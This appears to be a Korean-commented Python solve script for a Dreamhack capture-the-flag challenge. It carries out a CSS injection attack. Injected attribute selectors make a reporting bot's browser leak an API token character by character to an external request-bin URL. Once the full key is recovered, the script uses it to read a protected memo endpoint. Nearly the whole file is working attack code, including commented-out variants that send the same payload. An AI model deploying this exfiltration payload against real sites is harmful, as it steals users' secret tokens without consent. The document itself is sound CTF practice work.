import requests
import string

# 한 번 돌리면, request bin 에서 한 글자 가져와서 API 에 넣고 다시 실행
# 이 과정을 8번 반복

# API : 현재까지 찾은 API
API = "zrnqkuoz"

url = "http://host8.dreamhack.games:11770/api/memo"
headers = {'API-KEY' : API}

if len(API) == 8:
    response = requests.get(url, headers=headers)
    print(response.text)
else:
    data = {'path': ''}

    # 가능한 문자를 하나씩 가져옴
    for j in string.ascii_lowercase:
        url = "http://host8.dreamhack.games:11770/report"
        path = "mypage?color=red; } input[id=InputApitoken][value^=" + API + j + "] { background: url(https://ukemvgs.request.dreamhack.games?data=" + API + j + ");"
        data['path'] = path
        response = requests.post(url, data=data)
        print(f"현재 문자 : {j}, 응답 코드 : {response.status_code}")

    print(f"현재 API 길이 : {len(API)}, API : {API}")

# # status code 테스트 코드(결론적으로 맞거나 틀리거나 전부 200이 나옴)
# for j in string.ascii_lowercase:
#     response = requests.post("http://127.0.0.1:8000/report?path=/mypage?color=red; } input[id=InputApitoken][value^=" + j + "] { background: url(https://ukemvgs.request.dreamhack.games)")
#     print(j, response.status_code)

# # 이렇게 안되는 이유는 잘 모르겠다.
# for j in string.ascii_lowercase:
#     url = "http://host8.dreamhack.games:11770/report?path=mypage?color=red; } input[id=InputApitoken][value^=" + API + j + "] { background: url(https://ukemvgs.request.dreamhack.games?data=" + API + j + ");"
#     response = requests.post(url)

# 그리고 참고로 127.0.0.1:8000 에서는 먹히지 않았다.